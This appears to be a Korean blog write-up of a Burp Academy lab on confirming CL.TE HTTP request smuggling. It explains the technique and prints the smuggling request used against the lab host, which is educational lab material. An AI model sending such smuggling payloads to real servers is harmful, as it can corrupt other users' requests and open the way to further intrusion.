---
layout: post
title: "Burp Academy-HTTP Request Smuggling 관련 취약점: Confirming CL.TE vulnerabilities using differential responses"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, HTTP Request Smuggling]
toc: true
last_modified_at: 2024-01-09 09:00:00 +0900
---

# 개요
- HTTP Request Smuggling 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses
- 취약점 설명페이지1: https://portswigger.net/web-security/request-smuggling
- 취약점 설명페이지2: https://portswigger.net/web-security/request-smuggling/finding
- 난이도: PRACTITIONER (보통)

# 취약점 개요
- Burp Academy 에서는 HTTP Request Smuggling을 탐지하는 단계를 세 단계로 나눠서 가르치고 있다. 
- Indentifying과 Confirming, Exploiting이 그 것이다. Indentifying은 식별, Confirming은 확신정도로 이해하면 되겠다. Exploiting은 취약점을 악용하는 단계다.
- Indentifying에서는 타임아웃이 발생하는가를 주로 보고, Confirming에서는 실제로 HTTP요청을 밀반입해서 밀반입한 요청에 대한 HTTP응답이 돌아오는지를 본다. (따라서 오리지널 요청과 밀반입용 요청은 각각 다른 HTTP응답코드가 돌아오는 요청이어야 한다.)
- 예를 들어, CL.TE Confirm용의 HTTP요청은 다음과 같이 생겼다. 

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

- 백엔드에서는 TE를 보므로 `GET /404` 부터는 별도 요청으로 인식해서 다음순서의 HTTP 요청에 대해서 404응답을 회신한다. 
- 404응답이 돌아오면 스머글링이 성공했다고 확신(Confirm)할 수 있다.
- 이 랩에서는 HTTP Request Smuggling 컨펌용 요청(CL.TE패턴)을 사용하는 것을 실습한다.

# 랩 개요
- 이 랩은 프론트 엔드 서버와 백엔드 서버로 구성되어 있다. 프론트 엔드서버는 chunked encoding(TE헤더)를 지원하지 않는다. 
- 랩을 풀려면 백엔드 서버에게 HTTP요청을 밀반입해서, `/` 요청을 보냈을 때 404응답이 돌아오도록 하면 된다. 

```
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
```

# 도전
1. 취약점 설명에 있는 CL.TE Confirm용 페이로드를 그대로 사용해보자. 다음과 같이 된다. 

```http
POST / HTTP/1.1
Host: 0af10037042fd316812ed9c600230018.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

CL헤더의 값 49는 Foo: x 까지를 정확하게 포함한 값이다. 프론트엔드는 CL헤더를 보기 때문에 Foo: x까지를 하나의 요청으로 인식해서 백엔드로 보낸다. 백엔드는 TE헤더를 보므로 GET 부터는 다른 요청으로 인식한다. 

2. 요청을 보내본다. 동일한 요청을 두번 보내면 두번째부터는 404응답이 돌아오는 것을 볼 수 있다. 

![HTTP 요청 스머글링 시도](/images/burp-academy-hrs-4-1.png)

3. 웹 브라우저에서 페이지를 리로드하면 문제가 풀렸다는 메세지가 출력된다. 

![풀이 성공](/images/burp-academy-hrs-4-success.png)